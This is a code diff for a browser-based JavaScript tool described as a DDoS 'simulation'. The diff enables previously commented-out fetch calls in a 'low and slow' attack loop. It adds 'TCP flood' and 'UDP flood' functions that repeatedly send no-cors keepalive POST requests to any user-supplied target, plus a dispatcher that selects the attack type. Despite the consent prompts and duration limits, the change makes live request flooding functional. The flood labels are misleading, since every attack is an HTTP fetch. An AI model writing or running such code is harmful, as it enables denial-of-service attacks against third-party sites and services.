@@ -102,18 +102,18 @@ async function lowAndSlowDoS(target, durationSeconds) {
         try {
             // Simulate sending a slow, incomplete request
             log("Sending slow request to: " + target); // Removed sensitive target details in log.
-            //  fetch(target, {
-            //       method: 'POST',
-            //       body: 'This is a slow request...',
-            //       keepalive: true,
-            //       mode: 'no-cors' //To allow requests to other domains
-            //  })
-            //  .then(response => {
-            //      log(`Response received: ${response.status}`);
-            //  })
-            //  .catch(error => {
-            //      log(RED + "Error sending request: " + error + RESET);
-            //  });
+             fetch(target, {
+                  method: 'POST',
+                  body: 'This is a slow request...',
+                  keepalive: true,
+                  mode: 'no-cors' //To allow requests to other domains
+             })
+             .then(response => {
+                 log(`Response received: ${response.status}`);
+             })
+             .catch(error => {
+                 log(RED + "Error sending request: " + error + RESET);
+             });
 
             //Delay to simulate slowness.
             await new Promise(resolve => setTimeout(resolve, REQUEST_INTERVAL)); // Rate limiting
@@ -133,10 +133,97 @@ function toggleSafeMode() {
     alert(RED + "Safe mode " + (isSafeMode ? "ENABLED" : "DISABLED") + RESET);
 }
 
+// Function to add a TCP flood attack
+async function tcpFlood(target, durationSeconds) {
+    log(RED + "Starting TCP Flood attack simulation on: " + target + " for " + durationSeconds + " seconds." + RESET);
+
+    if (durationSeconds > MAX_DDOS_DURATION) {
+        log(RED + "Duration exceeds maximum allowed limit." + RESET);
+        alert(RED + "Duration exceeds maximum allowed limit of " + MAX_DDOS_DURATION + " seconds." + RESET);
+        return;
+    }
+
+    if (!await verifyPermissions(target)) {
+        return;
+    }
+
+    const startTime = Date.now();
+    let endTime = startTime + (durationSeconds * 1000);
+
+    while (Date.now() < endTime) {
+        try {
+            // Simulate sending a TCP packet
+            log("Sending TCP packet to: " + target);
+            fetch(target, {
+                method: 'POST',
+                body: 'SYN',
+                keepalive: true,
+                mode: 'no-cors' //To allow requests to other domains
+            })
+                .then(response => {
+                    log(`Response received: ${response.status}`);
+                })
+                .catch(error => {
+                    log(RED + "Error sending request: " + error + RESET);
+                });
+            //Delay to simulate slowness.
+            await new Promise(resolve => setTimeout(resolve, REQUEST_INTERVAL)); // Rate limiting
+        } catch (error) {
+            log(RED + "Error during attack: " + error + RESET);
+        }
+    }
+
+    log(RED + "TCP Flood attack simulation COMPLETED." + RESET);
+}
+
+// Function to add a UDP flood attack
+async function udpFlood(target, durationSeconds) {
+    log(RED + "Starting UDP Flood attack simulation on: " + target + " for " + durationSeconds + " seconds." + RESET);
+
+    if (durationSeconds > MAX_DDOS_DURATION) {
+        log(RED + "Duration exceeds maximum allowed limit." + RESET);
+        alert(RED + "Duration exceeds maximum allowed limit of " + MAX_DDOS_DURATION + " seconds." + RESET);
+        return;
+    }
+
+    if (!await verifyPermissions(target)) {
+        return;
+    }
+
+    const startTime = Date.now();
+    let endTime = startTime + (durationSeconds * 1000);
+
+    while (Date.now() < endTime) {
+        try {
+            // Simulate sending a UDP packet
+            log("Sending UDP packet to: " + target);
+            fetch(target, {
+                method: 'POST',
+                body: 'Random Data',
+                keepalive: true,
+                mode: 'no-cors' //To allow requests to other domains
+            })
+                .then(response => {
+                    log(`Response received: ${response.status}`);
+                })
+                .catch(error => {
+                    log(RED + "Error sending request: " + error + RESET);
+                });
+
+            //Delay to simulate slowness.
+            await new Promise(resolve => setTimeout(resolve, REQUEST_INTERVAL)); // Rate limiting
+        } catch (error) {
+            log(RED + "Error during attack: " + error + RESET);
+        }
+    }
+
+    log(RED + "UDP Flood attack simulation COMPLETED." + RESET);
+}
+
 // Main execution function (call this from your HTML button)
-async function startDDoS(target, duration) {
-    if (!target || !duration) {
-        alert(RED + "Please provide a valid target and duration." + RESET);
+async function startDDoS(target, duration, attackType) {
+    if (!target || !duration || !attackType) {
+        alert(RED + "Please provide a valid target, duration, and attack type." + RESET);
         return;
     }
 
@@ -145,7 +232,21 @@ async function startDDoS(target, duration) {
 
     if (await getUserConsent()) {
         log(RED + "User consent granted. Starting attack..." + RESET);
-        lowAndSlowDoS(actualTarget, duration);
+
+        switch (attackType) {
+            case 'lowAndSlow':
+                lowAndSlowDoS(actualTarget, duration);
+                break;
+            case 'tcpFlood':
+                tcpFlood(actualTarget, duration);
+                break;
+            case 'udpFlood':
+                udpFlood(actualTarget, duration);
+                break;
+            default:
+                alert(RED + "Invalid attack type." + RESET);
+                break;
+        }
     } else {
         log(RED + "User consent denied. Attack aborted." + RESET);
         alert(RED + "Attack aborted due to lack of consent." + RESET);
